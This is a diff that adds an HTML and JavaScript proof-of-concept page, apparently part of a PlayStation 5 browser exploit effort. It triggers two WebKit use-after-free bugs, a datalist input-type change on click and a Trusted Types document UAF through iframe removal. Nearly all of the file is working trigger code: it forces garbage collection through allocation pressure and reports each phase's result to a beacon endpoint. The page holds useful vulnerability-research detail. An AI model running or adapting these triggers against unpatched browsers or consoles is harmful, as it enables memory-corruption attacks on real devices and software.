@@ -1,0 +1,256 @@
+<!--
+  p675: CVE-2026-64783 — DataListButtonElement UAF via input type change on click
+  Fix: commit be08720593, Safari 26.6.1 (Aug 2026) — AFTER PS5 14.10 cutoff
+  Bug: 313521, researcher: many (Luke Francis, Shubham Chaskar, etc.)
+  
+  Mechanism:
+    DataListButtonElement stores owner as raw reference: DataListButtonOwner& m_owner
+    The only owner is TextFieldInputType.
+    When input.type is changed in a click handler:
+      1. HTMLInputElement::updateType() calls removeShadowSubtree()
+      2. m_dataListDropdownIndicator is nulled but m_owner in DataListButtonElement is NOT cleared
+      3. TextFieldInputType is freed
+      4. DataListButtonElement::defaultEventHandler() continues
+      5. m_owner.dataListButtonElementWasClicked() → UAF on freed TextFieldInputType
+  
+  Fix: changed m_owner to WeakPtr, added removeOwner() call in removeShadowSubtree()
+  
+  Trigger: 
+    - Create <input type="text" list="somelist"> with a <datalist>
+    - Add click listener that changes input.type = 'button'
+    - Click the input (or the datalist dropdown indicator)
+    - On vulnerable: UAF crash (freed TextFieldInputType accessed)
+    - On patched: no crash (WeakPtr is null, click is no-op)
+  
+  PS5 notes:
+    - No internals/UIHelper available, so we simulate click programmatically
+    - The datalist button is in shadow DOM — we click the input itself
+    - We also try dispatching click event directly
+    - GC forced via allocation pressure since no GCController
+  
+  CRASH_CLASS: HIGH (UAF on freed object — controlled crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p675</title></head>
+<body>p675: datalist UAF
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+
+<div id="testarea" style="position:absolute;left:-9999px">
+</div>
+
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P675-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+emit('START','v1');flush();
+
+// Force GC via allocation pressure (no GCController on PS5)
+function forceGC(){
+  var arr=[];
+  try{for(var i=0;i<50000;i++)arr.push({x:new ArrayBuffer(256)});}catch(e){}
+  arr=null;
+}
+
+var area=document.getElementById('testarea');
+
+// ================================================================
+// PHASE A: Check if datalist is supported
+// ================================================================
+emit('A','datalist-check');
+var hasDatalist=false;
+try{
+  var dl=document.createElement('datalist');
+  hasDatalist='options' in dl;
+  emit('A-RESULT','datalist='+(hasDatalist?'AVAILABLE':'MISSING'));
+}catch(e){emit('A-ERR',e.message);}
+flush();
+
+// ================================================================
+// PHASE B: Basic UAF trigger — click handler changes input type
+// On vulnerable: CRASH (m_owner dangling after TextFieldInputType freed)
+// On patched: no crash (WeakPtr<DataListButtonOwner> is null)
+// ================================================================
+emit('B','uaf-type-change');
+try{
+  // Setup: input with datalist
+  area.innerHTML='<input id="inp_b" type="text" list="dl_b" style="width:300px;height:50px">' +
+                 '<datalist id="dl_b"><option value="alpha"><option value="bravo"><option value="charlie"></datalist>';
+  var inp=document.getElementById('inp_b');
+  
+  var clickFired=false;
+  inp.addEventListener('click',function(e){
+    clickFired=true;
+    // This is the trigger: changing type frees TextFieldInputType
+    // but DataListButtonElement still holds raw ref to it
+    inp.type='button';
+    // Force GC to reclaim the freed TextFieldInputType
+    forceGC();
+  },{once:true});
+
+  // Programmatic click
+  inp.click();
+  
+  emit('B-CLICK','fired='+clickFired+' type='+inp.type);
+  emit('B-RESULT','SURVIVED — click handler ran, no crash');
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Aggressive variant — multiple type changes in sequence
+// ================================================================
+emit('C','aggressive-type-toggle');
+try{
+  area.innerHTML='<input id="inp_c" type="text" list="dl_c" style="width:300px;height:50px">' +
+                 '<datalist id="dl_c"><option value="x"><option value="y"></datalist>';
+  var inp2=document.getElementById('inp_c');
+  
+  var toggleCount=0;
+  inp2.addEventListener('click',function(){
+    toggleCount++;
+    inp2.type='button';
+    forceGC();
+    inp2.type='text'; // switch back — re-creates TextFieldInputType
+    forceGC();
+    inp2.type='number'; // switch again
+    forceGC();
+  });
+
+  for(var i=0;i<10;i++){
+    try{inp2.click();}catch(e){emit('C-INNER-ERR',e.message);break;}
+  }
+  emit('C-RESULT','SURVIVED — '+toggleCount+' toggles, no crash');
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: MouseEvent dispatch variant — try to hit defaultEventHandler
+// The real trigger needs clicking the datalist dropdown indicator button
+// which is in shadow DOM. Try dispatching mousedown+mouseup+click.
+// ================================================================
+emit('D','mouse-event-dispatch');
+try{
+  area.innerHTML='<input id="inp_d" type="text" list="dl_d" style="width:300px;height:50px">' +
+                 '<datalist id="dl_d"><option value="foo"><option value="bar"></datalist>';
+  var inp3=document.getElementById('inp_d');
+  
+  // Move to visible area briefly for event dispatch
+  area.style.position='static';
+  area.style.left='0';
+  
+  var phase_d_crashed=false;
+  inp3.addEventListener('mousedown',function(){
+    inp3.type='button';
+    forceGC();
+  },{once:true});
+
+  // Dispatch real mouse events
+  var rect=inp3.getBoundingClientRect();
+  var cx=rect.left+rect.width-10; // near right edge where datalist button would be
+  var cy=rect.top+rect.height/2;
+  
+  try{
+    inp3.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,clientX:cx,clientY:cy}));
+    inp3.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,clientX:cx,clientY:cy}));
+    inp3.dispatchEvent(new MouseEvent('click',{bubbles:true,clientX:cx,clientY:cy}));
+    emit('D-RESULT','SURVIVED — mouse events dispatched, no crash');
+  }catch(e){emit('D-RESULT','THREW-'+e.name+':'+e.message);}
+  
+  area.style.position='absolute';
+  area.style.left='-9999px';
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: Focus/blur variant — datalist interaction via focus
+// ================================================================
+emit('E','focus-blur-variant');
+try{
+  area.innerHTML='<input id="inp_e" type="text" list="dl_e">' +
+                 '<datalist id="dl_e"><option value="test1"><option value="test2"></datalist>';
+  var inp4=document.getElementById('inp_e');
+  
+  inp4.addEventListener('focus',function(){
+    setTimeout(function(){
+      inp4.type='range';
+      forceGC();
+      try{inp4.click();}catch(e){}
+      forceGC();
+      emit('E-RESULT','SURVIVED — focus+type change+click, no crash');
+      flush();
+    },0);
+  },{once:true});
+  
+  inp4.focus();
+  // E-RESULT will be emitted async
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE F: CVE-2026-64787 — Document UAF in trustedTypeCompliantString
+// Trigger: iframe with CSP trusted-types, move element, remove iframe
+// ================================================================
+emit('F','CVE-2026-64787-trusted-types');
+try{
+  // Check if Trusted Types are supported
+  var hasTT=typeof window.trustedTypes!=='undefined';
+  emit('F-TRUSTEDTYPES',hasTT?'AVAILABLE':'MISSING');
+  
+  if(!hasTT){
+    emit('F-RESULT','SKIP — no Trusted Types API');
+  } else {
+    // Create target element
+    var targetEl=document.createElement('div');
+    var iframe=document.createElement('iframe');
+    
+    // srcdoc with CSP requiring trusted types
+    iframe.srcdoc='<!DOCTYPE html><meta http-equiv="Content-Security-Policy" content="require-trusted-types-for \'script\'"><body><script>'+
+      'document.body.appendChild(parent.document.getElementById("tt_target"));'+
+      'parent.postMessage("ready","*");'+
+      '<\/script>';
+    
+    targetEl.id='tt_target';
+    document.body.appendChild(targetEl);
+    
+    window.addEventListener('message',function handler(ev){
+      if(ev.data!=='ready')return;
+      window.removeEventListener('message',handler);
+      
+      try{
+        // Move element back to parent
+        document.adoptNode(targetEl);
+        // Remove iframe — frees its Document
+        iframe.remove();
+        iframe=null;
+        forceGC();
+        
+        // Now try innerHTML on the element — its associated document is freed
+        try{
+          targetEl.innerHTML='test';
+          emit('F-RESULT','SURVIVED — innerHTML after iframe removal ok');
+        }catch(e2){
+          emit('F-RESULT','THREW-'+e2.name+':'+e2.message);
+        }
+      }catch(e){
+        emit('F-ERR','inner: '+e.message);
+      }
+      flush();
+    });
+    
+    document.body.appendChild(iframe);
+  }
+}catch(e){emit('F-ERR',e.name+':'+e.message);}
+flush();
+
+// Give async phases time to complete
+setTimeout(function(){
+  emit('DONE','p675-complete');
+  flush();
+},3000);
+
+})();
+</script>
+</body>
+</html>
